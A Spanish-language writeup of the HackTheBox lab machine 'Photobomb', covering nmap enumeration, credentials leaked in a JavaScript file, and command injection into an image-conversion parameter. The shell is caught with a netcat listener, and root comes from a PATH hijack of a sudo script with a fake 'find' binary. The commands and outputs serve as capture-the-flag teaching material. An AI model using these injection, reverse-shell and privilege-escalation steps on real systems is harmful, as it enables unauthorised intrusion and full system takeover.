---
title: HackTheBox Photobomb Writeup
published: true
---

La máquina Photobomb es una máquina de HackTheBox en la que mediante la explotación de esta conseguiremos la flag del usuario y la de root.


# [](#header-1)Enumeración

La enumeración se trata de una de las fases principales, en las que recolectamos la máxima información posible de la máquina víctima.

Usaremos nmap para analizar las seis primeras preguntas: 

```bash
nmap -p- --open --min-rate 5000 -vvv -n $IP-VICTIMA -oG allPorts
```

*  Escaneo todos los puertos abiertos: -p- --open

*  Mediante --min-rate 5000 indicamos que queremos emitir paquetes no más lentos que 5000 paquetes por segundo.

*  Triple verbose (-vvv) para que vaya reportando por consola los puertos abiertos y no tener que esperar al final del escaneo.

*  Para que el escaneo no aplique resolución DNS usamos -n

*  En mi caso exporto los puertos abiertos en formato grepeable (-oG) al archivo allPorts

```bash
❯ nmap -p- --open --min-rate 5000 -n -vvv 10.10.11.182 -oG puertos
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-02 14:36 EDT
Initiating Ping Scan at 14:36
Scanning 10.10.11.182 [2 ports]
Completed Ping Scan at 14:36, 0.05s elapsed (1 total hosts)
Initiating Connect Scan at 14:36
Scanning 10.10.11.182 [65535 ports]
Discovered open port 80/tcp on 10.10.11.182
Discovered open port 22/tcp on 10.10.11.182
Completed Connect Scan at 14:37, 11.59s elapsed (65535 total ports)
Nmap scan report for 10.10.11.182
Host is up, received syn-ack (0.047s latency).
Scanned at 2022-11-02 14:36:48 EDT for 12s
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.70 seconds
```

Tenemos dos puertos abiertos, analizaremos la versión y servicio de los mismos con nmap para intentar sacar más información:

```bash
❯ nmap -sCV -p22,80 10.10.11.182 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-02 14:38 EDT
Nmap scan report for photobomb.htb (10.10.11.182)
Host is up (0.040s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Photobomb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.20 seconds
```

Por ahora no vemos mucho más, nos metemos en la web y nos reporta una página con rexto y un panel de autentificación. Al inspeccionar la página observamos que existe un archivo .js en el que podemos acceder con un link directamente logeados.

> document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');

Al entrar vemos que nos podemos descargar imágenes con formato .jpg y .png

Interceptamos con burpsuite la petición y aparece la extensión png 

> POST /printer HTTP/1.1
> Host: photobomb.htb
> User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
> Accept-Language: en-US,en;q=0.5
> Accept-Encoding: gzip, deflate
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 78
> Origin: http://photobomb.htb
> Authorization: Basic cEgwdDA6YjBNYiE=
> Connection: close
> Referer: http://photobomb.htb/printer
> Upgrade-Insecure-Requests: 1
>
> photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=png&dimensions=3000x2000


# [](#header-1)Acceso al sistema

Tras esta podemos añadir : y una reverse shell pero deberá de estar en formato URL para que sea una línea.

-> <a href="https://www.revshells.com/">REVSHELLS</a>

Mandamos la petición al Repeater y le damos a send.

En nuestro equipo deberemos de ponernos en escucha con nc:

```bash
❯ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.156] from (UNKNOWN) [10.10.11.182] 44616
bash: cannot set terminal process group (735): Inappropriate ioctl for device
bash: no job control in this shell
wizard@photobomb:~/photobomb$ whoami
whoami
wizard
```

Obtenemos la flag del usuario.

# [](#header-1)Escalada de privilegios

Hacemos sudo -l para ver qué podemos ejecutar como root y nos reporta lo siguiente:

```bash
wizard@photobomb:~$ sudo -l     
sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

Esto quiere decir que podemos cambiar el path y ejecutar /opt/cleanup.sh

Lo abrimos para ver que comandos ejecuta y vemos que usa el comnado find de manera relativa.

```bash
wizard@photobomb:/opt$ cat cleanup.sh
cat cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

Podemos crear un archivo find que contenga bash, darle permisos de ejecución y ejecutar el script cambiando la variable path:

```bash
wizard@photobomb:~$ echo bash > find
echo bash > find
wizard@photobomb:~$ ls
ls
find
photobomb
temp
trepi
user.txt
wizard@photobomb:~$ chmod +x find
chmod +x find
wizard@photobomb:~$ sudo PATH=$PWD:$PATH /opt/cleanup.sh
sudo PATH=$PWD:$PATH /opt/cleanup.sh
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
```

Conseguimos así la flag de root en /root/root.txt

Muchas gracias por leer este writeup, espero que te haya gustado!
